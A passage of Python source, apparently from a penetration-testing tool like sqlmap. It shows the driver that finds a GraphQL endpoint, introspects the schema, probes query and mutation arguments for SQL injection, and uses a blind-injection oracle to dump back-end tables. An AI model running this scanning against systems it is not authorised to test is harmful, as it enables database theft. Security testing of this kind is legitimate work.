                            if ci < len(rows[ri]):
                                rows[ri][ci] = vals[ri]
            except Exception:
                pass
            finally:
                kb.data.dumpedTable = oldDumpedTable

        conf.dumper.singleString("GraphQL dump of table '%s' [%d]:\n%s" % (
            table, len(rows), _grid(columns, rows)))


def graphqlScan():
    # Entry point for '--graphql': detect the GraphQL endpoint, introspect the
    # schema, enumerate injectable argument slots, confirm an injection oracle on a
    # query slot, then fingerprint and blind-enumerate the SQL back-end through it
    # (banner, tables, full table dumps). Mutation slots are reported but not
    # exercised, to avoid modifying server-side data.

    global SENTINEL, COL_SEP
    SENTINEL = randomStr(length=10, lowercase=True)
    # randomize the per-row cell separator each run: a fixed "~~~" that legitimately occurs in a cell
    # would shift every subsequent column on split (silent corruption). A random token can't collide.
    COL_SEP = "~%s~" % randomStr(length=12, lowercase=True)

    debugMsg = "'--graphql' is self-contained: it discovers the GraphQL endpoint, "
    debugMsg += "enumerates the schema, and injects SQL/NoSQL payloads into reachable "
    debugMsg += "argument slots. SQL enumeration switches (e.g. --banner, --dbs, "
    debugMsg += "--tables) are ignored"
    logger.debug(debugMsg)

    url = conf.url.rstrip("/") if conf.url else ""

    if not url:
        logger.error("missing target URL")
        return

    # 1. Endpoint detection
    logger.info("probing for a GraphQL endpoint")

    # If the user supplied a URL that already contains '/graphql/' (e.g.
    # .../graphql/get_int?id=1, the broker probe URL), extract the base so
    # that probe paths are not appended to a non-GraphQL sub-path
    _m = re.match(r"(https?://[^/]+(?:/[^/]+)*?/graphql)(?:/.*)?$", url.rstrip("/"))
    if _m:
        url = _m.group(1)

    endpoint, _ = _detectEndpoint(url)
    if not endpoint:
        logger.error("no GraphQL endpoint found at '%s' (tried %d common paths)" % (
            url, len(GRAPHQL_ENDPOINT_PATHS) + 1))
        return

    logger.info("found GraphQL endpoint at '%s'" % endpoint)

    # 2. Schema introspection
    logger.info("introspecting the GraphQL schema")
    schema = _introspect(endpoint)

    if schema:
        types = schema.get("types") or []
        logger.info("introspection returned %d types" % len(types))
        slots = _extractSlots(schema)
        if not slots:
            logger.warning("no injectable argument slots found in the schema")
            _dumpSchema(schema, endpoint)
            return
    else:
        # Introspection blocked: try to recover the schema from field-suggestion errors
        logger.warning("introspection failed (disabled or rejected); trying suggestion-based recovery")
        slots = _introspectViaSuggestions(endpoint)
        if not slots:
            logger.error("could not recover the schema (introspection disabled and no field suggestions)")
            return

    querySlots = [_ for _ in slots if _.operation == "query"]
    mutationSlots = [_ for _ in slots if _.operation == "mutation"]

    logger.info("enumerated %d injectable argument slot(s): %d query, %d mutation" % (
        len(slots), len(querySlots), len(mutationSlots)))

    # 4. Schema dump (before detection -- matches regular sqlmap table/column
    # enumeration preceding data retrieval). Only when introspection succeeded; the
    # suggestion-recovered path has no full schema document to render.
    if schema:
        _dumpSchema(schema, endpoint)

    # 5. Per-slot detection; keep the first usable blind-SQLi oracle for enumeration
    oracle = None
    found = False

    for slot in querySlots:
        logger.info("testing slot %s.%s(%s:) [%s]" % (
            slot.parentType, slot.fieldName, slot.targetArg, slot.strategy))

        oracleType, slotOracle, _ = _testSlot(slot, endpoint)
        if oracleType:
            found = True
        if slotOracle and not oracle:
            oracle = slotOracle
            logger.info("retaining %s.%s(%s:) as the blind-SQLi oracle for back-end enumeration" % (
                slot.parentType, slot.fieldName, slot.targetArg))

    # 5b. Mutation slots are tested AUTOMATICALLY - but only when the (safer) query slots yielded no
    # oracle, ranked so read-like mutations (login/verify/token/...) run before write-like ones, and
    # each finding is gated by _testSlot's negative control + reproduction (a spurious write cannot be
    # reported). Detection uses the error-based / boolean-false / conditional-time probes, which resolve
    # in the lookup before any persistence. Impact is classified and reported per vector. As soon as a
    # mutation oracle is retained the loop stops, to minimise further writes.
    if mutationSlots and not oracle:
        logger.info("no query-slot oracle; automatically testing %d mutation slot(s) (read-like ranked first)" % len(mutationSlots))
        for slot in _rankMutations(mutationSlots):
            impact = _mutationImpact(slot.fieldName)
            logger.info("testing mutation slot %s.%s(%s:) [%s, impact: %s]" % (
                slot.parentType, slot.fieldName, slot.targetArg, slot.strategy, impact))
            oracleType, slotOracle, _ = _testSlot(slot, endpoint)
            if oracleType:
                found = True
                logger.info("mutation %s.%s(%s:) is injectable (impact classification: %s)" % (
                    slot.parentType, slot.fieldName, slot.targetArg, impact))
            if slotOracle:
                # Detection + report happen for EVERY confirmed mutation. But bulk blind enumeration
                # (fingerprint + catalog + full dump = hundreds/thousands of resolver executions) is
                # driven ONLY through a READ-LIKE mutation (login/verify/token/...). A write-like /
                # unknown mutation is reported but NOT used as the enumeration transport unless its
                # non-persistence is verified (a schema-backed, behaviour-confirmed dry-run/rollback -
                # not merely a forced dryRun:true, which a resolver may ignore/invert). This keeps
                # exploitation automatic without silently committing many writes.
                if impact == "read-like" or _dryRunVerified(slot, endpoint):
                    oracle = slotOracle
                    logger.info("retaining %s mutation %s.%s(%s:) as the enumeration oracle; stopping further mutation probes" % (
                        impact, slot.parentType, slot.fieldName, slot.targetArg))
                    break
                logger.warning("mutation %s.%s(%s:) is injectable but is WRITE-LIKE/UNKNOWN with unverified "
                               "non-persistence; reporting it WITHOUT driving bulk blind enumeration through it "
                               "(that would execute the write resolver many times). Re-target a read-like vector, "
                               "or expose a verified dry-run/rollback argument, to auto-enumerate through it." % (
                                   slot.parentType, slot.fieldName, slot.targetArg))

    # 6. Back-end enumeration through the retained oracle
    if oracle:
        _enumerate(oracle)

    if not found:
        logger.warning("no injectable slots found. The schema is shown above")

    logger.info("GraphQL scan complete")
